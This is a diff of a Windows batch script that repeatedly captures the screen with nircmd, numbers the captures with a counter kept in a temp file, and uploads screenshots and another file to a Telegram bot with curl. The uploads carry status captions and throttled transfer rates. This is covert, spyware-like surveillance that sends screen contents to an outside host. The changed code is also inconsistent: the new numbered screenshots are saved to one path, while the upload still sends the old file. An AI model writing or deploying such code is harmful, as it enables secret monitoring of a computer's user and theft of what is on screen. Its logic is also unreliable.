@@ -10,7 +10,7 @@ if not exist "%temp%\i059.tmp" type nul > "%temp%\i059.tmp"
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=3.7"
+set "BATCHVERSION=3.8"
 
 
 
@@ -234,14 +234,37 @@ set "FILE_PATH_MyScrn=%USERPROFILE%\Downloads\screenshot.png"
 
 
 
-"%nircmd%" savescreenshot "%USERPROFILE%\Downloads\screenshot.png"
+
+
+:: Define the file to track the last run time
+set "LASTSCREENFILE=%TEMP%\lastscreenrun.log"
+
+:: Check if the file exists
+if not exist "%LASTSCREENFILE%" (
+    echo 1 > "%LASTSCREENFILE%"
+) else (
+    for /f "delims=" %%A in ('type "%LASTSCREENFILE%"') do set /a TIMESS=%%A + 1
+    echo !TIMESS! > "%LASTSCREENFILE%"
+)
+
+:: Read the updated value
+set /p TIMESS=<"%LASTSCREENFILE%"
+echo TIMESS=%TIMESS%
+echo.
+echo.
+
+
+
+
+del /f /q "%USERPROFILE%\Downloads\screenshot%TIMESS%.png"
+"%nircmd%" savescreenshot "%USERPROFILE%\Downloads\LastScreenshots\screenshot%TIMESS%.png"
 
 
 :: Send Photo
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendPhoto" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
-     -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%|%time%|%BATCHVERSION%|" ^
+     -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|" ^
      -F "photo=@%FILE_PATH_MyScrn%" ^
      --limit-rate 80K
 
@@ -250,7 +273,7 @@ curl -s -X POST "https://api.telegram.org/bot%TOKEN_MyScrn%/sendDocument" ^
      -F "chat_id=%CHAT_ID_MyScrn%" ^
      -F "message_thread_id=%TOPIC_ID_MyScrn%" ^
      -F "document=@%output_file%" ^
-     -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%|%time%|%BATCHVERSION%|" ^
+     -F "caption=KadyyGmr|SHST%SHSTRUNNING%KMS%KMSRUNNING%|SCRNSHT%MINUTESS%(%TIMESS%)|%time%|%BATCHVERSION%|" ^
      --limit-rate 80K
 
 :RESETTO
@@ -266,7 +289,7 @@ echo 0 > "%LASTRUNFILE%"
 :GOGO2
 
 
-del /f /q "%USERPROFILE%\Downloads\screenshot.png"
+::del /f /q "%USERPROFILE%\Downloads\screenshot.png"
 
 
 :GOGO3
